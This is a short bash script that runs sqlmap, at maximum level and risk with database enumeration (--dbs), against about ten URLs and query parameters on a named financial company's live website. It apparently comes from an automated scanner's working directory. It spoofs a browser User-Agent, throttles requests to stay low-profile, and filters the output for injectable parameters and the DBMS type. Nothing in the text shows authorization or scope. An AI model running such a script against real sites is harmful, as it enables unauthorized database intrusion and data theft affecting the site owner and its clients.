#!/bin/bash
# Single-threaded, rate-limited sqlmap across every discovered parameter. Sequential + delay.
W=/var/lib/scanner/16e69f07-f908-482b-8fc5-492852a61a91/1f5fe7c8-5e28-45bc-8e08-a3e868bad87e/tool_outputs
mkdir -p "$W/sqlo"
UAS="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"

sm () {
  label="$1"; shift
  echo "===== START $label $(date +%T)"
  timeout 600 sqlmap -u "$1" --batch --level=5 --risk=3 --dbs --threads=1 --delay=1.2 \
     --timeout=20 --retries=1 --output-dir="$W/sqlo" "${@:2}" 2>&1 \
     | grep -Ei 'injectable|is vulnerable|back-end DBMS|DBMS|CRITICAL|does not seem|identified|sqlmap identified' \
     | sed "s/^/[$label] /"
  echo "===== END $label $(date +%T) rc=$?"
}

sm home_page   "https://www.infinitycapital.bh/?id=1&search=test&page=2" -H "User-Agent: $UAS"
sm home_page2  "https://www.infinitycapital.bh/?page=2" -H "User-Agent: $UAS"
sm home_id     "https://www.infinitycapital.bh/?id=1" -H "User-Agent: $UAS"
sm home_zzz    "https://www.infinitycapital.bh/?zzz=1" -H "User-Agent: $UAS"
sm home_search "https://www.infinitycapital.bh/?search=test" -H "User-Agent: $UAS"
sm contact_cb  "https://www.infinitycapital.bh/contact?cb=1" -H "User-Agent: $UAS"
sm contact_x   "https://www.infinitycapital.bh/contact?x=1" -H "User-Agent: $UAS"
sm nextimg     "https://www.infinitycapital.bh/_next/image?url=images%2Flogo.png&w=640&q=75" -H "User-Agent: $UAS"
sm apicontact  "https://www.infinitycapital.bh/api/contact?id=1" -H "User-Agent: $UAS"
sm apiiid      "https://www.infinitycapital.bh/api/?id=1" -H "User-Agent: $UAS"
echo "ALLDONE"
